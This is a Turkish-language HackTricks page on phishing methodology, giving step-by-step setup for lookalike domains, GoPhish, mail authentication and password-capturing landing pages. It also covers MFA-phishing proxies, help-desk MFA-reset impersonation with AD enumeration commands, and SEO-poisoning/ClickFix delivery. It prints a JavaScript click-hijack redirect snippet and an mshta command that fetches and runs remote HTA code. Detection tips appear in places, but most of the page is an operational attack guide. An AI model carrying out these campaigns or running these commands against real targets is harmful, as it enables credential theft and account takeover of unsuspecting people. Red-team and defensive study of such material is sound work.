# Phishing Metodolojisi

{{#include ../../banners/hacktricks-training.md}}

## Metodoloji

1. Kurban üzerinde Recon yapın
   1. **Kurbanın domain'ini** seçin.
   2. Kurbanın kullandığı **login portallarını aramak** için temel web enumeration işlemleri yapın ve hangisini **taklit edeceğinize** **karar verin**.
   3. **E-posta adreslerini bulmak** için **OSINT** kullanın.
2. Ortamı hazırlayın
   1. Phishing değerlendirmesinde kullanacağınız **domain'i satın alın**
   2. E-posta hizmetiyle ilgili kayıtları (SPF, DMARC, DKIM, rDNS) **yapılandırın**
   3. VPS'i **gophish** ile yapılandırın
3. Kampanyayı hazırlayın
   1. **E-posta şablonunu** hazırlayın
   2. Kimlik bilgilerini çalmak için **web sayfasını** hazırlayın
4. Kampanyayı başlatın!

## Benzer domain adları oluşturun veya güvenilir bir domain satın alın

### Domain Adı Değiştirme Teknikleri

- **Keyword**: Domain adı, orijinal domain'in önemli bir **keyword'ünü içerir** (ör. zelster.com-management.com).<sup>[[1]](#references)</sup>
- **hypened subdomain**: Bir subdomain'deki **noktayı tireyle değiştirin** (ör. www-zelster.com).
- **New TLD**: Aynı domain'i **yeni bir TLD** ile kullanın (ör. zelster.org)
- **Homoglyph**: Domain adındaki bir harfi **benzer görünen harflerle değiştirir** (ör. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Domain adındaki **iki harfin yerini değiştirir** (ör. zelsetr.com).
- **Singularization/Pluralization**: Domain adının sonuna “s” ekler veya sondaki “s” harfini kaldırır (ör. zeltsers.com).
- **Omission**: Domain adındaki harflerden **birini kaldırır** (ör. zelser.com).
- **Repetition:** Domain adındaki harflerden **birini tekrarlar** (ör. zeltsser.com).
- **Replacement**: Homoglyph'e benzer ancak daha az gizlidir. Domain adındaki harflerden birini, örneğin klavyede orijinal harfin yakınındaki bir harfle değiştirir (ör. zektser.com).
- **Subdomained**: Domain adının içine bir **nokta** ekler (ör. ze.lster.com).
- **Insertion**: Domain adına **bir harf ekler** (ör. zerltser.com).
- **Missing dot**: TLD'yi domain adına ekler (ör. zelstercom.com)

**Otomatik Araçlar**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Web Siteleri**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Güneş patlamaları, kozmik ışınlar veya donanım hataları gibi çeşitli etkenler nedeniyle depolanan ya da iletişim hâlindeki bitlerden bazılarının **otomatik olarak değişme olasılığı vardır**.

Bu kavram **DNS isteklerine uygulandığında**, **DNS sunucusunun aldığı domain'in** başlangıçta istenen domain'den farklı olması mümkündür.

Örneğin, "windows.com" domain'inde yapılan tek bitlik bir değişiklik, onu "windnws.com" olarak değiştirebilir.

Saldırganlar, kurbanın domain'ine benzeyen birden fazla bitflipping domain'i kaydederek bu durumdan **yararlanabilir**. Amaçları, meşru kullanıcıları kendi altyapılarına yönlendirmektir.

Daha fazla bilgi için [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/) sayfasını okuyun.<sup>[[10]](#references)[[11]](#references)</sup>

### Güvenilir bir domain satın alın

Kullanabileceğiniz süresi dolmuş bir domain'i [https://www.expireddomains.net/](https://www.expireddomains.net) adresinde arayabilirsiniz.\
Satın alacağınız süresi dolmuş domain'in **zaten iyi bir SEO değerine sahip olduğundan** emin olmak için, şu sitelerde nasıl kategorize edildiğine bakabilirsiniz:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## E-posta Adreslerini Keşfetme

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (%100 ücretsiz)
- [https://phonebook.cz/](https://phonebook.cz) (%100 ücretsiz)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Daha fazla geçerli e-posta adresi **keşfetmek** veya daha önce bulduğunuz adresleri **doğrulamak** için, kurbanın SMTP sunucularında brute force yapıp yapamayacağınızı kontrol edebilirsiniz. [E-posta adreslerini nasıl doğrulayacağınızı/keşfedeceğinizi buradan öğrenin](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Ayrıca, kullanıcıların e-postalarına erişmek için **herhangi bir web portalı** kullanıp kullanmadığını kontrol etmeyi unutmayın. Böyle bir portal varsa, **username brute force** saldırısına karşı savunmasız olup olmadığını kontrol edebilir ve mümkünse bu zafiyetten yararlanabilirsiniz.

## GoPhish'i Yapılandırma

### Kurulum

[https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0) adresinden indirebilirsiniz.

İndirin ve `/opt/gophish` içine açın, ardından `/opt/gophish/gophish` dosyasını çalıştırın.\
Çıktıda 3333 numaralı porttaki admin kullanıcısı için bir parola verilecektir. Bu nedenle, ilgili porta erişin ve admin parolasını değiştirmek için bu kimlik bilgilerini kullanın. Bu portu yerel makineye tünellemeniz gerekebilir:

```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```

### Yapılandırma

**TLS sertifikası yapılandırması**

Bu adımdan önce kullanacağınız **domain’i zaten satın almış** olmanız ve domain’in **gophish’i yapılandırdığınız VPS’in IP adresine yönleniyor** olması gerekir.

```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```

**Mail yapılandırması**

Kuruluma başlayın: `apt-get install postfix`

Ardından etki alanını şu dosyalara ekleyin:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**/etc/postfix/main.cf** içindeki şu değişkenlerin değerlerini de değiştirin:

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Son olarak **`/etc/hostname`** ve **`/etc/mailname`** dosyalarını etki alanı adınızla değiştirin ve **VPS'nizi yeniden başlatın.**

Şimdi `mail.<domain>` için VPS'nin **IP adresine** yönlendiren bir **DNS A kaydı** ve `mail.<domain>` adresini gösteren bir **DNS MX kaydı** oluşturun.

Şimdi e-posta göndermeyi deneyelim:

```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```

**Gophish yapılandırması**

gophish'in çalışmasını durdurun ve yapılandıralım.\
`/opt/gophish/config.json` dosyasını aşağıdaki gibi değiştirin (https kullanımına dikkat edin):

```bash
{
        "admin_server": {
                "listen_url": "127.0.0.1:3333",
                "use_tls": true,
                "cert_path": "gophish_admin.crt",
                "key_path": "gophish_admin.key"
        },
        "phish_server": {
                "listen_url": "0.0.0.0:443",
                "use_tls": true,
                "cert_path": "/opt/gophish/ssl_keys/key.crt",
                "key_path": "/opt/gophish/ssl_keys/key.pem"
        },
        "db_name": "sqlite3",
        "db_path": "gophish.db",
        "migrations_prefix": "db/db_",
        "contact_address": "",
        "logging": {
                "filename": "",
                "level": ""
        }
}
```

**gophish hizmetini yapılandırın**

gophish hizmetini otomatik olarak başlatmak ve bir hizmet olarak yönetmek için `/etc/init.d/gophish` dosyasını aşağıdaki içerikle oluşturabilirsiniz:

```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
    echo 'Starting '${processName}'...'
    cd ${appDirectory}
    nohup ./$process >>$logfile 2>>$errfile &
    sleep 1
}

stop() {
    echo 'Stopping '${processName}'...'
    pid=$(/bin/pidof ${process})
    kill ${pid}
    sleep 1
}

status() {
    pid=$(/bin/pidof ${process})
    if [["$pid" != ""| "$pid" != "" ]]; then
        echo ${processName}' is running...'
    else
        echo ${processName}' is not running...'
    fi
}

case $1 in
    start|stop|status) "$1" ;;
esac
```

Hizmeti yapılandırmayı ve kontrol etmeyi şu şekilde tamamlayın:

```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```

## Posta sunucusunu ve domain'i yapılandırma

### Bekleyin ve meşru olun

Bir domain ne kadar eskiyse spam olarak yakalanma olasılığı o kadar düşüktür. Bu nedenle phishing değerlendirmesinden önce mümkün olduğunca uzun süre (en az 1 hafta) beklemelisiniz. Ayrıca, itibarlı bir sektöre ait bir sayfa eklerseniz elde edilen itibar daha iyi olur.

Bir hafta beklemeniz gerekse bile her şeyi şimdi yapılandırmayı bitirebileceğinizi unutmayın.

### Reverse DNS (rDNS) kaydını yapılandırma

VPS'nin IP adresini domain adına çözen bir rDNS (PTR) kaydı ayarlayın.

### Sender Policy Framework (SPF) kaydı

Yeni domain için bir SPF kaydı **yapılandırmalısınız**. SPF kaydının ne olduğunu bilmiyorsanız [**bu sayfayı okuyun**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

SPF politikanızı oluşturmak için [https://www.spfwizard.net/](https://www.spfwizard.net) adresini kullanabilirsiniz (VPS makinesinin IP'sini kullanın).

![Phishing domain'i için SPF kaydı oluşturmaya yönelik SPF Wizard formu](<../../images/image (1037).png>)

Domain içindeki bir TXT kaydında ayarlanması gereken içerik şudur:

```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```

### Domain-based Message Authentication, Reporting & Conformance (DMARC) Kaydı

**Yeni domain için bir DMARC kaydı yapılandırmalısınız**. DMARC kaydının ne olduğunu bilmiyorsanız [**bu sayfayı okuyun**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Aşağıdaki içeriğe sahip, `_dmarc.<domain>` hostname'ine yönlendiren yeni bir DNS TXT kaydı oluşturmalısınız:

```bash
v=DMARC1; p=none
```

### DomainKeys Identified Mail (DKIM)

Yeni domain için bir **DKIM yapılandırmanız** gerekir. DKIM kaydının ne olduğunu bilmiyorsanız [**bu sayfayı okuyun**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Bu eğitim şu kaynağı temel alır: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> DKIM anahtarının oluşturduğu her iki B64 değerini birleştirmeniz gerekir:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### E-posta yapılandırma puanınızı test edin

Bunu [https://www.mail-tester.com/](https://www.mail-tester.com) kullanarak yapabilirsiniz\
Sayfaya girip size verdikleri adrese bir e-posta gönderin:

```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```

E-posta göndererek `check-auth@verifier.port25.com` adresine **e-posta yapılandırmanızı da kontrol edebilir** ve **yanıtı okuyabilirsiniz** (bunun için **25** numaralı portu açmanız ve e-postayı root olarak gönderirseniz yanıtı _/var/mail/root_ dosyasında görmeniz gerekir).\
Tüm testleri geçtiğinizden emin olun:

```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```

Ayrıca **kontrolünüzdeki bir Gmail adresine mesaj gönderebilir** ve Gmail gelen kutunuzdaki **e-posta başlıklarını** kontrol edebilirsiniz. `Authentication-Results` başlık alanında `dkim=pass` bulunmalıdır.

```
Authentication-Results: mx.google.com;
       spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
       dkim=pass header.i=@example.com;
```

### ​Spamhouse Kara Listesinden Kaldırma

[www.mail-tester.com](https://www.mail-tester.com) sayfası, alan adınızın spamhouse tarafından engellenip engellenmediğini gösterebilir. Alan adınızın/IP'nizin listeden kaldırılmasını şu adresten talep edebilirsiniz: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Microsoft Kara Listesinden Kaldırma

​​Alan adınızın/IP'nizin listeden kaldırılmasını [https://sender.office.com/](https://sender.office.com) adresinden talep edebilirsiniz.

## GoPhish Kampanyası Oluşturma ve Başlatma

### Gönderim Profili

- Gönderici profilini **tanımlamak için bir ad** belirleyin
- Phishing e-postalarını hangi hesaptan göndereceğinize karar verin. Öneriler: _noreply, support, servicedesk, salesforce..._
- Kullanıcı adı ve parola alanlarını boş bırakabilirsiniz, ancak Ignore Certificate Errors seçeneğini işaretlediğinizden emin olun

![GoPhish Kampanyası Oluşturma ve Başlatma - Gönderim Profili: Kullanıcı adı ve parola alanlarını boş bırakabilirsiniz, ancak Ignore Certificate Errors seçeneğini işaretlediğinizden emin olun](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Her şeyin çalıştığını test etmek için "**Send Test Email**" işlevini kullanmanız önerilir.\
> Test yaparken kara listeye alınmamak için test e-postalarını **10min mail adreslerine göndermenizi** öneririm.

### E-posta Şablonu

- Şablonu **tanımlamak için bir ad** belirleyin
- Ardından bir **konu** yazın (sıradan bir e-postada okumayı bekleyebileceğiniz bir şey olsun, alışılmadık bir şey olmasın)
- "**Add Tracking Image**" seçeneğini işaretlediğinizden emin olun
- **E-posta şablonunu** yazın (aşağıdaki örnekteki gibi değişkenler kullanabilirsiniz):

```html
<html>
<head>
    <title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```

E-postanın **inandırıcılığını artırmak için** müşteriye ait bir e-postadaki imzayı kullanmanız önerilir. Öneriler:

- **Var olmayan bir adrese** e-posta gönderin ve yanıtta imza olup olmadığını kontrol edin.
- info@ex.com, press@ex.com veya public@ex.com gibi **herkese açık e-posta adreslerini** bulun, bunlara e-posta gönderin ve yanıt bekleyin.
- Keşfettiğiniz **geçerli e-posta adreslerinden** birine ulaşmayı deneyin ve yanıt bekleyin.

![Gönderim Profili - E-posta Şablonu: Keşfettiğiniz geçerli e-posta adreslerinden birine ulaşmayı deneyin ve yanıt bekleyin](<../../images/image (80).png>)

> [!TIP]
> E-posta Şablonu, **gönderilecek dosyaları eklemenize** de olanak tanır. Özel olarak hazırlanmış dosyalar/belgeler kullanarak NTLM challenge'larını çalmak istiyorsanız [bu sayfayı okuyun](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Açılış Sayfası

- Bir **ad** yazın.
- Web sayfasının **HTML kodunu yazın**. Web sayfalarını **içe aktarabileceğinizi** unutmayın.
- **Capture Submitted Data** ve **Capture Passwords** seçeneklerini işaretleyin.
- Bir **yönlendirme** ayarlayın.

![E-posta Şablonu - Açılış Sayfası: Capture Submitted Data ve Capture Passwords seçeneklerini işaretleyin](<../../images/image (826).png>)

> [!TIP]
> Genellikle sayfanın HTML kodunu değiştirmeniz ve **sonuçtan memnun kalana kadar** yerel ortamda (örneğin bir Apache sunucusu kullanarak) bazı testler yapmanız gerekir. Ardından bu HTML kodunu kutuya yazın.\
> HTML'de **statik kaynaklar** (örneğin bazı CSS ve JS dosyaları) kullanmanız gerekiyorsa bunları _**/opt/gophish/static/endpoint**_ konumuna kaydedebilir ve ardından _**/static/\<filename>**_ üzerinden erişebilirsiniz.

> [!TIP]
> Yönlendirme için kullanıcıları kurbanın gerçek ana web sayfasına yönlendirebilir veya örneğin onları _/static/migration.html_ sayfasına yönlendirip, **5 saniye boyunca dönen bir yükleme simgesi (**[**https://loading.io/**](https://loading.io)**) gösterdikten sonra işlemin başarılı olduğunu belirtebilirsiniz**.

### Kullanıcılar ve Gruplar

- Bir ad belirleyin.
- **Verileri içe aktarın** (örnek şablonu kullanmak için her kullanıcının ad, soyad ve e-posta adresine ihtiyacınız olduğunu unutmayın).

![Açılış Sayfası - Kullanıcılar ve Gruplar: Verileri içe aktarın (örnek şablonu kullanmak için her kullanıcının ad, soyad ve e-posta adresine ihtiyacınız olduğunu unutmayın)](<../../images/image (163).png>)

### Kampanya

Son olarak bir ad, e-posta şablonu, açılış sayfası, URL, gönderim profili ve grup seçerek bir kampanya oluşturun. URL'nin kurbanlara gönderilecek bağlantı olacağını unutmayın.

**Gönderim Profilinin, son phishing e-postasının nasıl görüneceğini görmek için bir test e-postası göndermenize olanak tanıdığını** unutmayın:

![Kullanıcılar ve Gruplar - Kampanya: Gönderim Profilinin, son phishing e-postasının nasıl görüneceğini görmek için bir test e-postası göndermenize olanak tanıdığını unutmayın](<../../images/image (192).png>)

Her şey hazır olduğunda kampanyayı başlatın!

## Web Sitesi Klonlama

Herhangi bir nedenle web sitesini klonlamak istiyorsanız aşağıdaki sayfaya göz atın:


{{#ref}}
clone-a-website.md
{{#endref}}

## Arka Kapılı Belgeler ve Dosyalar

Bazı phishing değerlendirmelerinde (özellikle Red Team çalışmalarında) **bir tür arka kapı içeren dosyalar da göndermek** (belki bir C2 veya yalnızca kimlik doğrulamayı tetikleyecek bir şey) isteyebilirsiniz.\
Bazı örnekler için aşağıdaki sayfaya göz atın:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Proxy MitM ile

Önceki saldırı oldukça zekicedir; gerçek bir web sitesini taklit eder ve kullanıcının girdiği bilgileri toplarsınız. Ne yazık ki kullanıcı doğru parolayı girmediyse veya taklit ettiğiniz uygulama 2FA ile yapılandırılmışsa **bu bilgiler, kandırılan kullanıcı gibi davranmanıza olanak sağlamaz**.

[**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) ve [**muraena**](https://github.com/muraenateam/muraena) gibi araçlar bu noktada işe yarar. Bu araç, MitM benzeri bir saldırı gerçekleştirmenizi sağlar. Temel olarak saldırı şu şekilde işler:

1. Gerçek web sayfasındaki **oturum açma formunu taklit edersiniz**.
2. Kullanıcı **kimlik bilgilerini** sahte sayfanıza **gönderir**; araç da bu bilgileri gerçek web sayfasına göndererek **kimlik bilgilerinin geçerli olup olmadığını kontrol eder**.
3. Hesap **2FA** ile yapılandırılmışsa MitM sayfası kullanıcıdan 2FA kodunu ister. **Kullanıcı kodu girdiğinde** araç bunu gerçek web sayfasına gönderir.
4. Kullanıcı kimliği doğrulandıktan sonra, araç MitM işlemini sürdürürken siz (saldırgan olarak) **kimlik bilgilerini, 2FA kodunu, çerezi ve etkileşimler sırasındaki tüm bilgileri** toplamış olursunuz.

### VNC ile

**Kurbanı, özgün web sitesiyle aynı görünen kötü amaçlı bir sayfaya göndermek** yerine, onu gerçek web sayfasına bağlı bir tarayıcının bulunduğu **bir VNC oturumuna** gönderseniz ne olur? Kullanıcının yaptıklarını görebilir, parolayı, kullanılan MFA'yı, çerezleri ve diğer bilgileri çalabilirsiniz...\
Bunu [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) ile yapabilirsiniz.<sup>[[3]](#references)[[4]](#references)</sup>

## Tespiti Tespit Etme

Ele verildiğinizi anlamanın en iyi yollarından biri, şüphesiz **alan adınızı kara listelerde aramaktır**. Listede görünüyorsa alan adınız bir şekilde şüpheli olarak tespit edilmiştir.\
Alan adınızın herhangi bir kara listede olup olmadığını kontrol etmenin kolay bir yolu [https://malwareworld.com/](https://malwareworld.com) adresini kullanmaktır.

Ancak kurbanın **aktif olarak doğadaki şüpheli phishing etkinliklerini arayıp aramadığını** anlamanın başka yolları da vardır. Bunlar şu sayfada açıklanmıştır:


{{#ref}}
detecting-phising.md
{{#endref}}

Kurbanın alan adına **çok benzeyen bir alan adı satın alabilir** ve/veya sizin kontrolünüzdeki bir alan adının **alt alan adı** için, kurbanın alan adındaki **anahtar kelimeyi içeren bir sertifika oluşturabilirsiniz**. **Kurban** bu alan adlarıyla herhangi bir **DNS veya HTTP etkileşimi** gerçekleştirirse **şüpheli alan adlarını aktif olarak aradığını** anlarsınız ve çok gizli hareket etmeniz gerekir.<sup>[[2]](#references)</sup>

### Phishing'i değerlendirme

E-postanızın spam klasörüne düşüp düşmeyeceğini, engellenip engellenmeyeceğini veya başarılı olup olmayacağını değerlendirmek için [**Phishious** ](https://github.com/Rices/Phishious)kullanın.

## Yüksek Temaslı Kimlik İhlali (Yardım Masası MFA Sıfırlama)

Modern saldırı grupları, e-posta tuzaklarını tamamen atlayarak MFA'yı aşmak için giderek daha fazla **doğrudan hizmet masası / kimlik kurtarma iş akışını hedef alıyor**. Saldırı tamamen "living-off-the-land" yöntemine dayanır: operatör geçerli kimlik bilgilerini ele geçirdikten sonra yerleşik yönetim araçlarıyla ilerler; kötü amaçlı yazılım gerekmez.<sup>[[6]](#references)</sup>

### Saldırı akışı
1. Kurbanı keşfedin.
   * LinkedIn, veri ihlalleri, herkese açık GitHub vb. kaynaklardan kişisel ve kurumsal bilgileri toplayın.
   * Değerli kimlikleri (yöneticiler, IT, finans) belirleyin ve parola / MFA sıfırlama için kullanılan **tam yardım masası sürecini** öğrenin.
2. Gerçek zamanlı sosyal mühendislik
   * Hedefin kimliğine bürünerek yardım masasıyla telefon, Teams veya sohbet üzerinden iletişime geçin (genellikle **sahte arayan kimliği** veya **klonlanmış ses** kullanarak).
   * Bilgi tabanlı doğrulamayı geçmek için önceden topladığınız PII'yi paylaşın.
   * Temsilciyi **MFA sırrını sıfırlamaya** veya kayıtlı bir cep telefonu numarasına **SIM-swap** yapmaya ikna edin.
3. Erişimden hemen sonraki işlemler (gerçek vakalarda ≤60 dakika)
   * Herhangi bir web SSO portalı üzerinden bir dayanak noktası oluşturun.
   * Yerleşik araçlarla AD / AzureAD'yi tarayın (ikili dosya bırakmadan):
     ```powershell
     # list directory groups & privileged roles
     Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

     # AzureAD / Graph – list directory roles
     Get-MgDirectoryRole | ft DisplayName,Id

     # Enumerate devices the account can login to
     Get-MgUserRegisteredDevice -UserId <user@corp.local>
     ```
   * Ortamda zaten allowlist'e alınmış **WMI**, **PsExec** veya meşru **RMM** ajanlarıyla lateral movement.

### Tespit ve Azaltma
* Help-desk üzerinden kimlik kurtarmayı **privileged operation** olarak ele alın – step-up auth ve yönetici onayı isteyin.
* Şu durumlarda uyarı veren **Identity Threat Detection & Response (ITDR)** / **UEBA** kurallarını devreye alın:  
  * MFA yöntemi değişti + yeni bir cihazdan / coğrafi konumdan authentication yapıldı.  
  * Aynı principal anında yetki yükseltti (user-→-admin).  
* Help-desk aramalarını kaydedin ve herhangi bir sıfırlama öncesinde **önceden kayıtlı bir numaraya geri arama** yapılmasını zorunlu kılın.
* Yeni sıfırlanan hesapların yüksek ayrıcalıklı token'ları **otomatik olarak devralmaması** için **Just-In-Time (JIT) / Privileged Access** uygulayın.

---

## Ölçekli Aldatma – SEO Poisoning ve “ClickFix” Campaign'leri
Commodity ekipler, **arama motorlarını ve reklam ağlarını dağıtım kanalına** dönüştüren kitlesel saldırılarla yoğun emek gerektiren operasyonların maliyetini dengeler.<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising**, `chromium-update[.]site` gibi sahte bir sonucu arama reklamlarının en üstüne taşır.
2. Kurban küçük bir **first-stage loader** indirir (genellikle JS/HTA/ISO). Unit 42 tarafından görülen örnekler:
   * `RedLine stealer`
   * `Lumma stealer`
   * `Lampion Trojan`
3. Loader, tarayıcı çerezlerini ve kimlik bilgisi veritabanlarını dışarı sızdırır, ardından *gerçek zamanlı olarak* aşağıdakilerden hangisinin dağıtılacağına karar veren bir **silent loader** indirir:
   * RAT (örn. AsyncRAT, RustDesk)
   * ransomware / wiper
   * kalıcılık bileşeni (registry Run key + scheduled task)

### Güçlendirme ipuçları
* Yeni kaydedilmiş domain'leri engelleyin ve e-postanın yanı sıra *search-ads* için de **Advanced DNS / URL Filtering** uygulayın.
* Yazılım kurulumunu imzalı MSI / Store paketleriyle kısıtlayın; ilkeyle `HTA`, `ISO`, `VBS` çalıştırılmasını engelleyin.
* Tarayıcıların yükleyicileri açan child process'lerini izleyin:
  ```yaml
  - parent_image: /Program Files/Google/Chrome/*
    and child_image: *\\*.exe
  ```
* İlk aşama yükleyicilerinin sıkça kötüye kullandığı LOLBins'leri araştırın (örn. `regsvr32`, `curl`, `mshta`).

### TDS aktarımıyla indirme düğmesi tıklamasını ele geçirme
Bazı sahte yazılım portalları, görünür indirme `href` değerini **gerçek** GitHub/release URL'sine yönlendirirken JavaScript ile kullanıcının **ilk** etkileşimini ele geçirip kurbanı bunun yerine bir **Traffic Distribution System (TDS)** zincirine yönlendirir.<sup>[[9]](#references)</sup>

```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
  if (!isEligibleClick(e.target)) return;
  cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
  e.stopImmediatePropagation();
  e.preventDefault();
}, true);
```

Temel özellikler:
- Hook genellikle `document` üzerinde **capture phase** (`true`) aşamasında çalışır; böylece site handler'larından önce tetiklenir.
- Chrome, yönlendirmeyi geçerli bir **user gesture** ile ilişkilendirmek ve popup-blocker bypass olasılığını artırmak için genellikle `click` yerine `mousedown` kullanır.
- Bazı varyantlar önceden `about:blank` açar veya `<a target="_blank">` tıklamalarını taklit eder ve TDS URL'sini ancak daha sonra atar.
- Tarayıcı tarafındaki limitler genellikle `localStorage` içinde tutulur; bu nedenle **ilk tıklama** malware'e ulaşabilirken yenileme/yeniden deneme işlemleri, zararsız görünen görünür bağlantıya yönlenebilir.
- TDS; referrer, giriş domain'i, GEO, tarayıcı/cihaz fingerprint'i, VPN/datacenter kontrolleri, tıklama bağlamı ve oturum başına sayaçlara göre filtreleme yapabilir; bu da analistlerin tekrar denemelerinde tutarsız sonuçlar doğurabilir.

Savunma önerileri:
- Görüntülenen `href` ile tıklama anında oluşturulan **gerçek** gezinme hedefini karşılaştırın.
- `window.open`, `about:blank` veya taklit edilen anchor tıklamaları çevresinde hem `preventDefault()` hem de `stopImmediatePropagation()` çağıran `document.addEventListener(..., true)` handler'larını arayın.
- Aynı CloudFront/JS aşamasını yükleyen, yeni kaydedilmiş yazılım indirme domain'lerinden oluşan kümeleri, yüksek güvenilirlikli bir SEO poisoning/TDS örüntüsü olarak değerlendirin.

### Sahte doğrulama sayfalarından ClickFix + arşiv gibi görünen LOLBAS fetch'leri
Bazı TDS dalları, kurbandan aşağıdaki gibi güvenilir bir Windows binary'sini çalıştırmasını isteyen sahte bir doğrulama sayfasıyla (Cloudflare/IUAM tarzı) sonuçlanır:<sup>[[9]](#references)</sup>

```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```

Notlar:
- `mshta.exe`, URL `.7z` arşiviymiş gibi görünse bile yanıtın başındaki **HTA/VBScript** kodunu çalıştırır; sonuna eklenen arşiv verileri tamamen dikkat dağıtıcı olabilir.
- Sonraki aşamalar genellikle dosya türü hakkında yalan söylemeye devam eder (`.rtf` uzantısıyla PowerShell, `.asar` uzantısıyla Python, içeriği doldurulmuş ikili dosyalar içeren ZIP’ler) ve ardından **manuel PE eşleme / bellekte yürütme** aşamasına geçer.
- Bu zincirlerden biriyle karşılaşırsanız **ilk başarılı çalıştırmadan itibaren ağ + bellek verilerini** koruyun: sonraki tekrarlar yalnızca zararsız bir yükleyici/SFX yolunu gösterebilir veya yükün/anahtarın serbest bırakılması özgün TDS oturumuna bağlı olduğundan başarısız olabilir.

### ClickFix DLL delivery tradecraft (sahte CERT güncellemesi)
